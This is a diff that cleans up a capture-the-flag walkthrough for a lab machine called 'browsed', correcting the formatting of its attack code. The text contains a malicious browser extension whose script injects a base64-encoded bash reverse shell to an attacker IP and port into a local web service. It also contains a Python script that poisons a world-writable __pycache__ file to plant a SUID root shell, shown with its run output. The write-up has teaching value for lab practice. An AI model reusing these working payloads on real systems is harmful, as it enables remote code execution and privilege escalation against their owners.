@@ -198,32 +198,33 @@ Let's create a malicious extension.
 
 ```manifest.json
 {
-  "manifest _version": 3,
+  "manifest_version": 3,
   "name": "exploit",
   "version": "0.1",
   "description": "exploit",
   "background": {
-    "service _worker": "exploit.js"
+    "service_worker": "exploit.js"
   },
-  "host _permissions":  [
-    " ://127.0.0.1/", " ://localhost/"
+  "host_permissions": [
+    "http://127.0.0.1/*",
+    "http://localhost/*"
   ]
 }
 ```
 
 ```exploit.js
 (function() {
-    const TARGET _BASE = "http://127.0.0.1:5000/routines/";
-    const ATTACKER _IP = "10.10.16.26"; 
-    const ATTACKER _PORT = "9001";
-    const revShellCommand = bash -i > & /dev/tcp/${ATTACKER _IP}/${ATTACKER _PORT} 0> &1;
+    const TARGET_BASE = "http://127.0.0.1:5000/routines/";
+    const ATTACKER_IP = "10.10.14.33"; 
+    const ATTACKER_PORT = "9001";
+    const revShellCommand = `bash -c 'bash -i >& /dev/tcp/${ATTACKER_IP}/${ATTACKER_PORT} 0>&1'`;
     const b64Payload = btoa(revShellCommand);
     const space = " ";
-    const injection = a [$(echo${space}${b64Payload}|base64${space}-d|bash)];
-    const finalURL = TARGET _BASE + encodeURIComponent(injection);
+    const injection = `a[$(echo${space}${b64Payload}|base64${space}-d|bash)]`;
+    const finalURL = TARGET_BASE + encodeURIComponent(injection);
 
     // Optional: Let you know the script started on your port 80 (python -m http.server 80)
-    fetch(http://${ATTACKER _IP}/ALIVE).catch(() => {});
+    fetch(`http://${ATTACKER_IP}/ALIVE`).catch(() => {});
 
     // Trigger the Exploit
     fetch(finalURL, { 
@@ -232,14 +233,16 @@ Let's create a malicious extension.
     }).then(() => {
         console.log("Payload sent to internal target.");
     }).catch((err) => {
-        console.error("Fetch failed, likely due to environment restrictions.");
+        console.error("Fetch failed:", err);
     });
 })();
 ```
 
 Zip the files, it is recommended to use Junk Paths Zip command, so that the information remains on root of the Zip file we upload.
 
+```
 zip -j exploit.zip manifest.json exploit.js
+```
 
 Optional: Start a python server on port 80, just to make sure our script has started.
 
@@ -293,10 +296,10 @@ There are pair of ssh-keys in the home directory, if you want to ssh with a prop
 
 ```bash
 larry@browsed:~/.ssh$ ls
-authorized _keys  id _ed25519  id _ed25519.pub
+authorized_keys  id_ed25519  id_ed25519.pub
 ```
 
-Checking sudo privileges, we can run /opt/extensiontool/extension _tool.py as root.
+Checking sudo privileges, we can run /opt/extensiontool/extension_tool.py as root.
 
 ```bash
 karry@browsed:~/sudo -l
@@ -304,7 +307,7 @@ Matching Defaults entries for larry on browsed:
     env _reset, mail _badpass, secure _path=/usr/local/sbin  :/usr/local/bin  :/usr/sbin  :/usr/bin  :/sbin  :/bin  :/snap/bin, use _pty
 
 User larry may run the following commands on browsed:
-    (root) NOPASSWD: /opt/extensiontool/extension _tool.py
+    (root) NOPASSWD: /opt/extensiontool/extension_tool.py
 ```
 
 Let's see and what we have in there.
@@ -315,9 +318,9 @@ total 24
 drwxr-xr-x 4 root root 4096 Feb  3 13:08 .
 drwxr-xr-x 4 root root 4096 Aug 17 12:55 ..
 drwxrwxr-x 5 root root 4096 Mar 23  2025 extensions
--rwxrwxr-x 1 root root 2739 Mar 27  2025 extension _tool.py
--rw-rw-r-- 1 root root 1245 Mar 23  2025 extension _utils.py
-drwxrwxrwx 2 root root 4096 Feb  3 12:20  _ _pycache _ _
+-rwxrwxr-x 1 root root 2739 Mar 27  2025 extension_tool.py
+-rw-rw-r-- 1 root root 1245 Mar 23  2025 extension_utils.py
+drwxrwxrwx 2 root root 4096 Feb  3 12:20 __pycache__
 ```
 
 There are bunch of python scripts, but look at  _ _pycache _ _, it is world-writable. So, cache poisoning is what we will do.
@@ -326,88 +329,85 @@ In a /tmp directory, create a python script which will read the original stats, 
 
 ```exploit.py
 import os
-import py _compile
+import os
+import py_compile
 import shutil
- # --- Configuration ---
- # Update TARGET _CACHE if 'ls /opt/extensiontool/ _ _pycache _ _/' shows a different version
-ORIGINAL _SOURCE = "/opt/extensiontool/extension _utils.py"
-TARGET _CACHE = "/opt/extensiontool/ _ _pycache _ _/extension _utils.cpython-312.pyc"
-TEMP _SOURCE = "/tmp/extension _utils.py"
-TEMP _PYC = "/tmp/extension _utils.pyc"
 
-def poison _cache():
+# --- Configuration ---
+ORIGINAL_SOURCE = "/opt/extensiontool/extension_utils.py"
+TARGET_CACHE = "/opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc"
+TEMP_SOURCE = "/tmp/extension_utils.py"
+TEMP_PYC = "/tmp/extension_utils.pyc"
+
+def poison_cache():
     try:
         # 1. Get original stats (Size and Mtime)
-        print(f" [ *] Getting stats from {ORIGINAL _SOURCE}...")
-        st = os.stat(ORIGINAL _SOURCE)
-        orig _size = st.st _size
-        orig _mtime = st.st _mtime
-        print(f"    - Original Size: {orig _size} bytes")
-        print(f"    - Original Mtime: {orig _mtime}")
+        print(f"[*] Getting stats from {ORIGINAL_SOURCE}...")
+        st = os.stat(ORIGINAL_SOURCE)
+        orig_size = st.st_size
+        orig_mtime = st.st_mtime
+        print(f"    - Original Size: {orig_size} bytes")
+        print(f"    - Original Mtime: {orig_mtime}")
 
         # 2. Define the malicious payload
-        # We include BOTH functions found in the ImportError: validate _manifest and clean _temp _files
-        payload _code = (
-            "import os  n"
-            "os.system('cp /bin/bash /tmp/rootbash  && chmod +s /tmp/rootbash')  n  n"
-            "def validate _manifest(path):  n"
-            "    return True  n  n"
-            "def clean _temp _files():  n"
-            "    return True  n"
+        payload_code = (
+            "import os\n"
+            "os.system('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash')\n\n"
+            "def validate_manifest(path):\n"
+            "    return True\n\n"
+            "def clean_temp_files():\n"
+            "    return True\n"
         )
 
         # 3. Pad to exact original size
-        # We use a comment block (#) to fill the remaining space so the byte count matches perfectly
-        current _len = len(payload _code)
-        if current _len > orig _size:
-            print(" [-] Error: Your payload is too large for the original file size.")
+        current_len = len(payload_code)
+        if current_len > orig_size:
+            print("[-] Error: Your payload is too large for the original file size.")
             return
 
-        padding _needed = orig _size - current _len - 1
-        final _source = payload _code + "  n" + ("#"  * padding _needed)
+        padding_needed = orig_size - current_len - 1
+        final_source = payload_code + "\n" + ("#" * padding_needed)
 
-        with open(TEMP _SOURCE, "w") as f:
-            f.write(final _source)
+        with open(TEMP_SOURCE, "w") as f:
+            f.write(final_source)
 
         # 4. Sync the source timestamp
-        # py _compile uses the source's Mtime to write the header of the .pyc file
-        os.utime(TEMP _SOURCE, (orig _mtime, orig _mtime))
-        print(" [+] Malicious source created and timestamp synced.")
+        os.utime(TEMP_SOURCE, (orig_mtime, orig_mtime))
+        print("[+] Malicious source created and timestamp synced.")
 
         # 5. Compile into Bytecode
-        # This generates the .pyc file with the metadata we spoofed
-        py _compile.compile(TEMP _SOURCE, cfile=TEMP _PYC)
-        print(f" [+] Malicious bytecode compiled to {TEMP _PYC}")
+        py_compile.compile(TEMP_SOURCE, cfile=TEMP_PYC)
+        print(f"[+] Malicious bytecode compiled to {TEMP_PYC}")
 
         # 6. Inject the poisoned file
-        shutil.copyfile(TEMP _PYC, TARGET _CACHE)
-        print(f" [+] Poisoned .pyc successfully injected into {TARGET _CACHE}")
+        shutil.copyfile(TEMP_PYC, TARGET_CACHE)
+        print(f"[+] Poisoned .pyc successfully injected into {TARGET_CACHE}")
 
     except Exception as e:
-        print(f" [-] Exploit failed: {e}")
+        print(f"[-] Exploit failed: {e}")
 
-if  _ _name _ _ == " _ _main _ _":
-    poison _cache()
+if __name__ == "__main__":
+    poison_cache()
 ```
 
 Run the exploit.
 
 ```bash
 larry@browsed:/tmp$ python3 exploit.py
- [ *] Getting stats from /opt/extensiontool/extension _utils.py...
+[*] Getting stats from /opt/extensiontool/extension_utils.py...
     - Original Size: 1245 bytes
     - Original Mtime: 1742727379.0
- [+] Malicious source created and timestamp synced.
- [+] Malicious bytecode compiled to /tmp/extension _utils.pyc
- [+] Poisoned .pyc successfully injected into /opt/extensiontool/ _ _pycache _ _/extension _utils.cpython-312.pyc
+[+] Malicious source created and timestamp synced.
+[+] Malicious bytecode compiled to /tmp/extension_utils.pyc
+[+] Poisoned .pyc successfully injected into /opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc
 ```
 
 Now, run the sudo command.
 
 ```bash
-larry@browsed:/tmp$ sudo /opt/extensiontool/extension _tool.py --ext Exploit
- [-] Skipping version bumping
- [-] Skipping packaging
+larry@browsed:/tmp$ sudo /opt/extensiontool/extension_tool.py --ext Fontify
+[-] Skipping version bumping
+[-] Skipping packaging
 ```
 
 Now, check in /tmp, we will have a rootbash as a SUID.
